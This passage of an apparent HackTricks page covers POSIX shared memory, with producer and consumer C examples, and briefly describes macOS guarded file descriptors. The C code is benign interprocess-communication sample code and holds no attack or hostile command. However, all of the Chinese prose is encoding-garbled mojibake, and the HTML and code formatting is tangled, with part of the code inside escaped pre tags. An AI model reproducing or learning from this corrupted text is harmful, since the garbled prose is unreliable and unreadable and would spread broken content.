<p><strong>POSIX å…±äº«å†…å­˜</strong> å…è®¸åœ¨ POSIX å…¼å®¹æ“ä½œç³»ç»Ÿä¸­çš„è¿›ç¨‹è®¿é—®ä¸€ä¸ªå…¬å…±å†…å­˜åŒºåŸŸï¼Œä¸å…¶ä»–è¿›ç¨‹é—´é€šä¿¡æ–¹æ³•ç›¸æ¯”ï¼Œä¿ƒè¿›äº†æ›´å¿«çš„é€šä¿¡ã€‚å®ƒæ¶‰åŠä½¿ç”¨ <code>shm_open()</code> åˆ›å»ºæˆ–æ‰“å¼€ä¸€ä¸ªå…±äº«å†…å­˜å¯¹è±¡ï¼Œä½¿ç”¨ <code>ftruncate()</code> è®¾ç½®å…¶å¤§å°ï¼Œå¹¶ä½¿ç”¨ <code>mmap()</code> å°†å…¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚è¿›ç¨‹å¯ä»¥ç›´æ¥ä»è¿™ä¸ªå†…å­˜åŒºåŸŸè¯»å–å’Œå†™å…¥ã€‚ä¸ºäº†ç®¡ç†å¹¶å‘è®¿é—®å¹¶é˜²æ­¢æ•°æ®æŸåï¼Œé€šå¸¸ä½¿ç”¨äº’æ–¥é”æˆ–ä¿¡å·é‡ç­‰åŒæ­¥æœºåˆ¶ã€‚æœ€åï¼Œè¿›ç¨‹ä½¿ç”¨ <code>munmap()</code> å’Œ <code>close()</code> è§£é™¤æ˜ å°„å¹¶å…³é—­å…±äº«å†…å­˜ï¼Œå¹¶å¯é€‰æ‹©ä½¿ç”¨ <code>shm_unlink()</code> åˆ é™¤å†…å­˜å¯¹è±¡ã€‚è¯¥ç³»ç»Ÿåœ¨å¤šä¸ªè¿›ç¨‹éœ€è¦å¿«é€Ÿè®¿é—®å…±äº«æ•°æ®çš„ç¯å¢ƒä¸­ï¼Œå°¤å…¶æœ‰æ•ˆäºé«˜æ•ˆã€å¿«é€Ÿçš„ IPCã€‚</p>
<details>
<summary>ç”Ÿäº§è€…ä»£ç ç¤ºä¾‹</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
<p>int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object</p>
<p>// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}</p>
<p>// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}</p>
<p>// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}</p>
<p>// Write to the shared memory
sprintf(ptr, "Hello from Producer!");</p>
<p>// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);</p>
<p>return 0;
}</p>
<pre><code>&lt;/details&gt;

&lt;details&gt;

&lt;summary&gt;æ¶ˆè´¹è€…ä»£ç ç¤ºä¾‹&lt;/summary&gt;
```c
// gcc consumer.c -o consumer -lrt
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

</code></pre>
</details>
<h2 id="macos-å—ä¿æŠ¤æè¿°ç¬¦"><a class="header" href="#macos-å—ä¿æŠ¤æè¿°ç¬¦">macOS å—ä¿æŠ¤æè¿°ç¬¦</a></h2>
<p><strong>macOS å—ä¿æŠ¤æè¿°ç¬¦</strong> æ˜¯åœ¨ macOS ä¸­å¼•å…¥çš„ä¸€é¡¹å®‰å…¨åŠŸèƒ½ï¼Œæ—¨åœ¨å¢å¼ºç”¨æˆ·åº”ç”¨ç¨‹åºä¸­ <strong>æ–‡ä»¶æè¿°ç¬¦æ“ä½œ</strong> çš„å®‰å…¨æ€§å’Œå¯é æ€§ã€‚è¿™äº›å—ä¿æŠ¤çš„æè¿°ç¬¦æä¾›äº†ä¸€ç§å°†ç‰¹å®šé™åˆ¶æˆ–â€œä¿æŠ¤â€ä¸æ–‡ä»¶æè¿°ç¬¦å…³è”çš„æ–¹æ³•ï¼Œè¿™äº›é™åˆ¶ç”±å†…æ ¸å¼ºåˆ¶æ‰§è¡Œã€‚</p>
<p>æ­¤åŠŸèƒ½ç‰¹åˆ«æœ‰åŠ©äºé˜²æ­¢æŸäº›ç±»åˆ«çš„å®‰å…¨æ¼æ´ï¼Œä¾‹å¦‚ <strong>æœªç»æˆæƒçš„æ–‡ä»¶è®¿é—®</strong> æˆ– <strong>ç«äº‰æ¡ä»¶</strong>ã€‚è¿™äº›æ¼æ´å‘ç”Ÿåœ¨ä¾‹å¦‚ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨è®¿é—®ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå¯¼è‡´ <strong>å¦ä¸€ä¸ªæ˜“å—æ”»å‡»çš„çº¿ç¨‹å¯¹å…¶è®¿é—®</strong>ï¼Œæˆ–è€…å½“ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦è¢« <strong>ç»§æ‰¿</strong> ç»™ä¸€ä¸ªæ˜“å—æ”»å‡»çš„å­è¿›ç¨‹æ—¶ã€‚ä¸æ­¤åŠŸèƒ½ç›¸å…³çš„ä¸€äº›å‡½æ•°åŒ…æ‹¬ï¼š</p>
<ul>
<li><code>guarded_open_np</code>: ä»¥ä¿æŠ¤æ–¹å¼æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦</li>
<li><code>guarded_close_np</code>: å…³é—­å®ƒ</li>
<li><code>change_fdguard_np</code>: æ›´æ”¹æè¿°ç¬¦ä¸Šçš„ä¿æŠ¤æ ‡å¿—ï¼ˆç”šè‡³ç§»é™¤ä¿æŠ¤ï¼‰</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/">https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-code-signing.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-fs-tricks/macos-xattr-acls-extra-stuff.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-code-signing.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-fs-tricks/macos-xattr-acls-extra-stuff.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../../elasticlunr.min.js"></script>
        <script src="../../../../mark.min.js"></script>
        <script src="../../../../searcher.js"></script>

        <script src="../../../../clipboard.min.js"></script>
        <script src="../../../../highlight.js"></script>
        <script src="../../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
